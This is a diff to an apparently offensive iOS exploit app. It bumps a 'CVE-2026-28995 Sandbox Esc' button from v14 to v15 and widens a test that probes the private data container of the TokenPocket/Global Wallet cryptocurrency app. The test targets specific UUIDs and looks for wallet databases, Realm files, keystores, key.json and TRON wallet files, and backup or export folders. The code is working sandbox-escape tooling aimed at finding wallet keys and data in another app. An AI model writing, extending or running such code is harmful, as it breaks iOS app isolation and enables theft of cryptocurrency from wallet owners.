@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v14" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v15" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7376,55 +7376,89 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
 
-    // Test 11: Read TokenPocket data container (UUID from pymobiledevice3)
-    // Data UUID: 0D926318-FE07-4B1D-8A4B-5278C4E380D5
-    // Bundle: Global Wallet.app v2.19.0
+    // Test 11: Read TokenPocket data container
     [log appendString:@"\n--- Test 11: TokenPocket container read ---\n"];
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // Probe known wallet/keystore files
     [log appendString:@"  Probing TokenPocket files:\n"];
 
-    // Common wallet storage locations
+    // v15: expanded probe — Realm, deeper paths, more DB names
     for (NSString *f in @[
-        // Root container
-        @".com.apple.mobile_container_manager.metadata.plist",
-        // Documents
+        // Directories (existence check)
         @"Documents/",
-        // Library/Preferences
+        @"Library/",
         @"Library/Preferences/",
-        // Common wallet DB files
+        @"Library/Application Support/",
+        @"Library/Caches/",
+        @"Library/Application Support/com.global.wallet.ios/",
+        @"Library/Application Support/GlobalWallet/",
+        @"Library/Application Support/TokenPocket/",
+        // App group / shared container
+        @"../",
+        // SQLite / DB files
         @"Documents/wallet.db",
         @"Documents/tokenpocket.db",
         @"Documents/tp.db",
         @"Documents/data.db",
-        @"Documents/wallet.sqlite",
-        @"Documents/wallet.sqlite3",
-        // Library files
-        @"Library/Application Support/",
-        @"Library/Caches/",
-        // Keystore files
+        @"Documents/global_wallet.db",
+        @"Documents/tp_wallet.db",
+        @"Documents/tpwallet.db",
+        @"Library/Application Support/wallet.db",
+        @"Library/Application Support/tokenpocket.db",
+        @"Library/Application Support/data.db",
+        // Realm database (common in mobile wallets)
+        @"Documents/default.realm",
+        @"Documents/tp.realm",
+        @"Documents/wallet.realm",
+        @"Documents/tokenpocket.realm",
+        @"Library/Application Support/default.realm",
+        @"Library/Caches/default.realm",
+        // Keystore / JSON wallet files
         @"Documents/keystore",
         @"Documents/key.json",
         @"Documents/wallet.json",
-        // TRON-specific
-        @"Documents/tron",
-        @"Documents/tron_wallet",
+        @"Documents/accounts.json",
+        @"Documents/tron_wallet.json",
+        // TRON specific
+        @"Documents/tron/",
+        @"Documents/tron_wallet/",
+        // TokenPocket own directories
+        @"Documents/TokenPocket/",
+        @"Documents/GlobalWallet/",
+        @"Documents/TPWallet/",
+        // UserDefaults plist
         @"Library/Preferences/com.global.wallet.ios.plist",
+        @"Library/Preferences/com.tokenpocket.plist",
+        @"Library/Preferences/group.com.global.wallet.ios.plist",
+        // iTunes metadata
+        @"iTunesMetadata.plist",
+        // Common wallet export files
+        @"Documents/backup/",
+        @"Documents/export/",
     ]) {
         NSString *sub = [tpBase stringByAppendingPathComponent:f];
         probeFile(sub, log);
     }
 
-    // Read TokenPocket's Info.plist from bundle
+    // Check bundle Info.plist (try both with/without /private prefix)
     NSString *tpBundleUUID = @"97028E76-0192-4651-BF43-3BFCAC8D9BA9";
-    NSString *tpInfoPath = [NSString stringWithFormat:
+    [log appendString:@"\n  Bundle probe:\n"];
+    probeFile([NSString stringWithFormat:
         @"var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist",
-        tpBundleUUID];
-    [log appendString:@"\n  TokenPocket Bundle Info.plist:\n"];
-    probeFile(tpInfoPath, log);
+        tpBundleUUID], log);
+    probeFile([NSString stringWithFormat:
+        @"var/containers/Bundle/Application/%@/Global Wallet.app/",
+        tpBundleUUID], log);
+    probeFile([NSString stringWithFormat:
+        @"private/var/containers/Bundle/Application/%@/Global Wallet.app/Info.plist",
+        tpBundleUUID], log);
+
+    // Read Contents.json or other bundle metadata
+    probeFile([NSString stringWithFormat:
+        @"var/containers/Bundle/Application/%@/Global Wallet.app/Contents.json",
+        tpBundleUUID], log);
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
